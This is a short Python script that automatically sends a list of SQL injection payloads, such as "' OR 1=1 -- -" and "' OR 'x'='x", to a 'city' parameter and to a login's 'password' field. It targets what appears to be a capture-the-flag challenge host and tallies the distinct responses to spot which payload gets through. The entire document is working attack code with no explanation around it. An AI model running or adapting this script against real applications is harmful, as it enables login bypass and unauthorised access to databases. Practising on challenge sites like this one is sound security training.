import requests

options = [
    "'",
    "''",
    "`",
    "``",
    ",",
    '"',
    '""',
    "/",
    "//",
    "\\",
    "\\",
    ";",
    "-- or # ",
    "' OR '1",
    "' OR 1 -- -",
    '" OR "" = "',
    '" OR 1 = 1 -- -',
    "' OR '' = '",
    "'='",
    "'LIKE'",
    "'=0--+",
    " OR 1=1",
    "' OR 'x'='x",
    "' AND id IS NULL; --"
]

destination_url = 'http://ch4ll3ng3s.hackrocks.com:3363/destination'
user_url = 'http://ch4ll3ng3s.hackrocks.com:3363/user'
headers = {'accept': '*'}
all_responses = []

# --- Function to make requests and store responses ---
def make_requests(url, param_name, options, other_params=None):
    for option in options:
        params = {param_name: option}
        if other_params:
            params.update(other_params)
        try:
            response = requests.get(url, headers=headers, params=params, timeout=5)
            all_responses.append(response.text)
            print(f"{param_name}: {option}, Status Code: {response.status_code}")
        except requests.exceptions.Timeout:
            all_responses.append("Timeout")
            print(f"Timeout error for {param_name}: {option}")
        except requests.exceptions.RequestException as e:
            error_message = str(e)
            all_responses.append(f"Error: {error_message[:20]}...")
            print(f"Error for {param_name} {option}: {error_message[:20]}...")
        print("-" * 20)

# --- Make requests for both endpoints ---
make_requests(destination_url, 'city', options)
make_requests(user_url, 'password', options, {'username': 'user'})

# --- Analyze responses ---
unique_responses = {}
for resp in all_responses:
    if resp in unique_responses:
        unique_responses[resp] += 1
    else:
        unique_responses[resp] = 1

# --- Print unique responses and their counts ---
print("\n--- Unique Responses and Counts ---")
for response, count in unique_responses.items():
    print(f"Response: {response[:100]}...")  # Print first 100 characters
    print(f"Count: {count}")
    print("-" * 20)
